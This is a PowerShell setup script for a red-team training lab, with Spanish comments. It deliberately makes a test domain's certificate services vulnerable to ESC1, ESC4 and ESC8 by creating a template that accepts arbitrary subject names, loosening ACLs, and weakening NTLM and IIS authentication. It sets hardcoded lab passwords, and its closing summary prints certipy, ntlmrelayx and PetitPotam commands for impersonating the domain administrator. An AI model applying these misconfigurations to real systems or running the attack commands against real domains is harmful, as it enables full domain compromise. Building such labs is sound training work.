# ============================================================
#  DARK GATE — Lab-03 ADCS Abuse
#  Setup Script v1.1: Configuración de vulnerabilidades ADCS
#  Operación: APT29 Emulation | MITRE ATT&CK v14
#  Autor: Red Team Ops Roadmap — Adrián Camacho
#  Ejecutar como: Administrador en DC-01
#
#  PREREQUISITOS:
#    - Dominio atackcorp.local activo (Lab-01 configurado)
#    - ADCS instalado y CertSvc corriendo
#    - IIS instalado (para ESC8)
#
#  VULNERABILIDADES CONFIGURADAS:
#    [ESC1] Plantilla VulnerableUser — SAN arbitrario
#           msPKI-Certificate-Name-Flag = 1
#           Domain Users pueden solicitar cert con UPN arbitrario
#    [ESC4] fin.garcia tiene GenericWrite + WriteDacl sobre VulnerableUser
#           Nota v1.1: Certipy v5 requiere WriteDacl además de GenericWrite
#    [ESC8] Web Enrollment HTTP habilitado en http://DC-01/certsrv/
#           EPA deshabilitado, kernel-mode auth deshabilitado
#           LmCompatibilityLevel = 2
#           Nota v1.1: En WS2022 el relay SMB→HTTP está bloqueado por KB5005413
#
#  CAMBIOS v1.1 (fixes de ejecución real):
#    - Añadido WriteDacl + WriteProperty a fin.garcia (requerido por Certipy v5)
#    - Contraseña fin.garcia establecida automáticamente (Finance2024!)
#    - Configuración kernel-mode auth via applicationHost.config como fallback
#    - LmCompatibilityLevel = 2 añadido para relay NTLM
#    - Nota ESC8: KB5005413 bloquea relay en WS2022 — documentado en resumen
#    - UPN nota: admin en español es "Administrador" no "administrator"
# ============================================================

#Requires -RunAsAdministrator
Import-Module ActiveDirectory

$Domain    = "atackcorp.local"
$DomainDN  = (Get-ADDomain).DistinguishedName
$DomainSID = (Get-ADDomain).DomainSID.Value

Write-Host ""
Write-Host "============================================================" -ForegroundColor Cyan
Write-Host "  DARK GATE — Lab-03 ADCS Setup v1.1" -ForegroundColor Cyan
Write-Host "  Dominio: $Domain" -ForegroundColor Cyan
Write-Host "  CA:      AtackCorp-CA" -ForegroundColor Cyan
Write-Host "============================================================" -ForegroundColor Cyan
Write-Host ""

# ─────────────────────────────────────────────────────────────
# BLOQUE 0 — Verificación de prerrequisitos
# ─────────────────────────────────────────────────────────────
Write-Host "[*] BLOQUE 0 — Verificando prerrequisitos..." -ForegroundColor Yellow

$CertSvc = Get-Service CertSvc -ErrorAction SilentlyContinue
if ($null -eq $CertSvc) {
    Write-Host "    [!] ADCS no instalado. Ejecutar primero:" -ForegroundColor Red
    Write-Host "        Install-WindowsFeature -Name ADCS-Cert-Authority -IncludeManagementTools" -ForegroundColor Gray
    Write-Host "        Install-AdcsCertificationAuthority -CAType EnterpriseRootCa -CACommonName 'AtackCorp-CA' -Force" -ForegroundColor Gray
    exit 1
}
if ($CertSvc.Status -ne "Running") {
    Start-Service CertSvc; Start-Sleep -Seconds 3
}
Write-Host "    [+] CertSvc: Running" -ForegroundColor Green

foreach ($user in @("fin.garcia", "ceo.martinez")) {
    try {
        Get-ADUser $user -ErrorAction Stop | Out-Null
        Write-Host "    [+] Usuario encontrado: $user" -ForegroundColor Green
    } catch {
        Write-Host "    [!] USUARIO NO ENCONTRADO: $user — ejecutar Setup-Lab01-GhostForest-v2.ps1 primero" -ForegroundColor Red
        exit 1
    }
}

# Establecer contraseña de fin.garcia (requerida para ESC4)
Set-ADAccountPassword -Identity "fin.garcia" `
    -NewPassword (ConvertTo-SecureString "Finance2024!" -AsPlainText -Force) `
    -Reset -ErrorAction SilentlyContinue
Write-Host "    [+] Contraseña fin.garcia: Finance2024!" -ForegroundColor Green

# ─────────────────────────────────────────────────────────────
# BLOQUE 1 — ESC1: Plantilla VulnerableUser
# T1649 — Steal or Forge Authentication Certificates
# ─────────────────────────────────────────────────────────────
Write-Host ""
Write-Host "[*] BLOQUE 1 — Configurando ESC1 (VulnerableUser)..." -ForegroundColor Yellow

$ConfigContext     = ([ADSI]"LDAP://RootDSE").configurationNamingContext
$TemplateContainer = [ADSI]"LDAP://CN=Certificate Templates,CN=Public Key Services,CN=Services,$ConfigContext"
$ExistingTemplate  = $TemplateContainer.Children | Where-Object {$_.Name -eq "VulnerableUser"}

if (-not $ExistingTemplate) {
    $UserTemplate = $TemplateContainer.Children | Where-Object {$_.Name -eq "User"}
    $NewTemplate  = $TemplateContainer.Create("pKICertificateTemplate", "CN=VulnerableUser")
    $NewTemplate.Put("displayName", "VulnerableUser")
    $NewTemplate.Put("pKIDefaultKeySpec", 1)
    $NewTemplate.Put("pKIMaxIssuingDepth", 0)
    $NewTemplate.Put("msPKI-Enrollment-Flag", 0)
    $NewTemplate.Put("msPKI-Private-Key-Flag", 0)
    $NewTemplate.Put("msPKI-Certificate-Name-Flag", 1)    # ← ESC1
    $NewTemplate.Put("msPKI-Minimal-Key-Size", 2048)
    $NewTemplate.Put("msPKI-Template-Schema-Version", 2)
    $NewTemplate.Put("msPKI-Template-Minor-Revision", 1)
    $NewTemplate.Put("msPKI-RA-Signature", 0)
    $NewTemplate.Put("pKIDefaultCSPs", @("1,Microsoft Enhanced Cryptographic Provider v1.0"))
    $NewTemplate.Put("revision", "100")
    $NewTemplate.Put("pKIKeyUsage", $UserTemplate.pKIKeyUsage.Value)
    $NewTemplate.Put("pKIExpirationPeriod", $UserTemplate.pKIExpirationPeriod.Value)
    $NewTemplate.Put("pKIOverlapPeriod", $UserTemplate.pKIOverlapPeriod.Value)
    $NewTemplate.Put("pKIExtendedKeyUsage", $UserTemplate.pKIExtendedKeyUsage.Value)
    $OID = "1.3.6.1.4.1.311.21.8." + (Get-Random -Minimum 1000000 -Maximum 9999999) + "." + (Get-Random -Minimum 1000000 -Maximum 9999999)
    $NewTemplate.Put("msPKI-Cert-Template-OID", $OID)
    $NewTemplate.SetInfo()
    Write-Host "    [+] Plantilla VulnerableUser creada (OID: $OID)" -ForegroundColor Green
} else {
    Write-Host "    [*] Plantilla VulnerableUser ya existe" -ForegroundColor Yellow
}

$Template       = [ADSI]"LDAP://CN=VulnerableUser,CN=Certificate Templates,CN=Public Key Services,CN=Services,$ConfigContext"
$DomainUsersSID = New-Object System.Security.Principal.SecurityIdentifier("$DomainSID-513")
$EnrollRule     = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
    $DomainUsersSID,
    [System.DirectoryServices.ActiveDirectoryRights]::ExtendedRight,
    [System.Security.AccessControl.AccessControlType]::Allow,
    [GUID]"0e10c968-78fb-11d2-90d4-00c04fc2dcd2"
)
$ACL = $Template.ObjectSecurity
$ACL.AddAccessRule($EnrollRule)
$Template.CommitChanges()
Write-Host "    [+] Permisos Enroll asignados a Domain Users (SID-513)" -ForegroundColor Green

try {
    Add-CATemplate -Name "VulnerableUser" -Force -ErrorAction Stop
    Write-Host "    [+] Plantilla publicada en AtackCorp-CA" -ForegroundColor Green
} catch {
    Write-Host "    [*] Plantilla ya publicada o error: $_" -ForegroundColor Yellow
}

# ─────────────────────────────────────────────────────────────
# BLOQUE 2 — ESC4: fin.garcia Write sobre VulnerableUser
# T1222 — File and Directory Permissions Modification
# NOTA v1.1: Certipy v5 requiere WriteDacl + WriteProperty además de GenericWrite
# ─────────────────────────────────────────────────────────────
Write-Host ""
Write-Host "[*] BLOQUE 2 — Configurando ESC4 (fin.garcia GenericWrite + WriteDacl)..." -ForegroundColor Yellow

try {
    $FinGarciaSID = (Get-ADUser "fin.garcia").SID
    $Template     = [ADSI]"LDAP://CN=VulnerableUser,CN=Certificate Templates,CN=Public Key Services,CN=Services,$ConfigContext"

    $WriteRule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
        $FinGarciaSID,
        [System.DirectoryServices.ActiveDirectoryRights]::GenericWrite,
        [System.Security.AccessControl.AccessControlType]::Allow
    )
    # WriteDacl + WriteProperty requerido por Certipy v5
    $WriteDaclRule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
        $FinGarciaSID,
        [System.DirectoryServices.ActiveDirectoryRights]"WriteDacl,WriteProperty",
        [System.Security.AccessControl.AccessControlType]::Allow
    )
    $ACL = $Template.ObjectSecurity
    $ACL.AddAccessRule($WriteRule)
    $ACL.AddAccessRule($WriteDaclRule)
    $Template.CommitChanges()
    Write-Host "    [+] ESC4: fin.garcia tiene GenericWrite + WriteDacl + WriteProperty" -ForegroundColor Green
} catch {
    Write-Host "    [!] Error configurando ESC4: $_" -ForegroundColor Red
}

# ─────────────────────────────────────────────────────────────
# BLOQUE 3 — ESC8: Web Enrollment HTTP
# T1557 — NTLM Relay
# NOTA v1.1: KB5005413 en WS2022 bloquea relay SMB→HTTP
#            ESC8 es identificable con Certipy pero no explotable en WS2022
# ─────────────────────────────────────────────────────────────
Write-Host ""
Write-Host "[*] BLOQUE 3 — Configurando ESC8 (Web Enrollment HTTP)..." -ForegroundColor Yellow

$Feature = Get-WindowsFeature ADCS-Web-Enrollment -ErrorAction SilentlyContinue
if ($Feature.InstallState -ne "Installed") {
    Install-WindowsFeature -Name ADCS-Web-Enrollment -IncludeManagementTools | Out-Null
    Write-Host "    [+] Feature ADCS-Web-Enrollment instalada" -ForegroundColor Green
}
try {
    Install-AdcsWebEnrollment -Force | Out-Null
    Write-Host "    [+] Web Enrollment configurado" -ForegroundColor Green
} catch {
    Write-Host "    [*] Web Enrollment ya configurado" -ForegroundColor Yellow
}
Start-Service W3SVC -ErrorAction SilentlyContinue
Write-Host "    [+] IIS W3SVC: $((Get-Service W3SVC).Status)" -ForegroundColor Green

# Deshabilitar EPA via applicationHost.config
try {
    $config = "C:\Windows\System32\inetsrv\config\applicationHost.config"
    (Get-Content $config) -replace 'useKernelMode="true"', 'useKernelMode="false"' | Set-Content $config
    Write-Host "    [+] Kernel-mode auth deshabilitado (applicationHost.config)" -ForegroundColor Green
} catch {
    Write-Host "    [!] Error modificando applicationHost.config: $_" -ForegroundColor Red
}

# LmCompatibilityLevel = 2 (permite NTLMv1 + NTLMv2)
try {
    Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa `
        -Name "LmCompatibilityLevel" -Value 2 -Type DWord -ErrorAction Stop
    Write-Host "    [+] LmCompatibilityLevel = 2" -ForegroundColor Green
} catch {
    Write-Host "    [!] Error configurando LmCompatibilityLevel: $_" -ForegroundColor Red
}

iisreset /noforce | Out-Null
Write-Host "    [+] IIS reiniciado — Endpoint: http://$(hostname)/certsrv/" -ForegroundColor Green

# ─────────────────────────────────────────────────────────────
# BLOQUE 4 — Verificación final
# ─────────────────────────────────────────────────────────────
Write-Host ""
Write-Host "[*] BLOQUE 4 — Verificación del escenario..." -ForegroundColor Yellow

$TemplateCheck = certutil -catemplates 2>&1 | Select-String "VulnerableUser"
if ($TemplateCheck) { Write-Host "    [+] ESC1: VulnerableUser publicada en CA ✅" -ForegroundColor Green }
else { Write-Host "    [!] ESC1: Plantilla NO en CA" -ForegroundColor Red }

$Template  = [ADSI]"LDAP://CN=VulnerableUser,CN=Certificate Templates,CN=Public Key Services,CN=Services,$ConfigContext"
$NameFlag  = $Template.'msPKI-Certificate-Name-Flag'
if ($NameFlag -eq 1) { Write-Host "    [+] ESC1: msPKI-Certificate-Name-Flag = 1 ✅" -ForegroundColor Green }
else { Write-Host "    [!] ESC1: Flag incorrecto ($NameFlag)" -ForegroundColor Red }

$ACL       = $Template.ObjectSecurity
$FinAccess = $ACL.Access | Where-Object {$_.IdentityReference -match "garcia"}
if ($FinAccess) { Write-Host "    [+] ESC4: fin.garcia tiene permisos ✅" -ForegroundColor Green }
else { Write-Host "    [!] ESC4: fin.garcia sin permisos detectados" -ForegroundColor Red }

if ((Get-Service W3SVC).Status -eq "Running") { Write-Host "    [+] ESC8: IIS corriendo ✅" -ForegroundColor Green }
else { Write-Host "    [!] ESC8: IIS no está corriendo" -ForegroundColor Red }

# ─────────────────────────────────────────────────────────────
# RESUMEN FINAL
# ─────────────────────────────────────────────────────────────
Write-Host ""
Write-Host "============================================================" -ForegroundColor Cyan
Write-Host "  DARK GATE — Escenario listo" -ForegroundColor Cyan
Write-Host "============================================================" -ForegroundColor Cyan
Write-Host ""
Write-Host "  CREDENCIALES:" -ForegroundColor White
Write-Host "    ceo.martinez : Direccion2024!   (Domain User — ESC1)" -ForegroundColor Gray
Write-Host "    fin.garcia   : Finance2024!     (GenericWrite — ESC4)" -ForegroundColor Gray
Write-Host ""
Write-Host "  PATH A [ESC1]:" -ForegroundColor Magenta
Write-Host "    certipy-ad req -u ceo.martinez@atackcorp.local -p 'Direccion2024!'" -ForegroundColor Gray
Write-Host "      -ca AtackCorp-CA -template VulnerableUser" -ForegroundColor Gray
Write-Host "      -upn Administrador@atackcorp.local -dc-ip 10.0.2.10" -ForegroundColor Gray
Write-Host "    certipy-ad auth -pfx administrador.pfx -dc-ip 10.0.2.10 -domain atackcorp.local" -ForegroundColor Gray
Write-Host "    NOTA: UPN es 'Administrador' (mayuscula) no 'administrator'" -ForegroundColor Yellow
Write-Host ""
Write-Host "  PATH B [ESC4]:" -ForegroundColor Magenta
Write-Host "    certipy-ad template -u fin.garcia@atackcorp.local -p 'Finance2024!'" -ForegroundColor Gray
Write-Host "      -dc-ip 10.0.2.10 -template VulnerableUser" -ForegroundColor Gray
Write-Host "      -save-configuration VulnerableUser_backup.json" -ForegroundColor Gray
Write-Host "    certipy-ad template ... -write-default-configuration -force" -ForegroundColor Gray
Write-Host "    certipy-ad req ... -upn Administrador@atackcorp.local -out administrador_esc4" -ForegroundColor Gray
Write-Host "    certipy-ad template ... -write-configuration VulnerableUser_backup.json -force" -ForegroundColor Gray
Write-Host ""
Write-Host "  PATH C [ESC8] - BLOQUEADO en WS2022 (KB5005413):" -ForegroundColor Magenta
Write-Host "    impacket-ntlmrelayx -t http://10.0.2.10/certsrv/certfnsh.asp --adcs" -ForegroundColor Gray
Write-Host "    python3 /opt/redteam/PetitPotam.py -u ceo.martinez -p 'Direccion2024!'" -ForegroundColor Gray
Write-Host "      -d atackcorp.local -pipe all 10.0.2.9 10.0.2.10" -ForegroundColor Gray
Write-Host "    NOTA: Funciona en WS2016/WS2019 sin KB5005413" -ForegroundColor Yellow
Write-Host ""
Write-Host "  VERIFICAR desde Kali:" -ForegroundColor White
Write-Host "    certipy-ad find -u ceo.martinez@atackcorp.local -p 'Direccion2024!'" -ForegroundColor Gray
Write-Host "      -dc-ip 10.0.2.10 -stdout" -ForegroundColor Gray
Write-Host "============================================================" -ForegroundColor Cyan
Write-Host ""
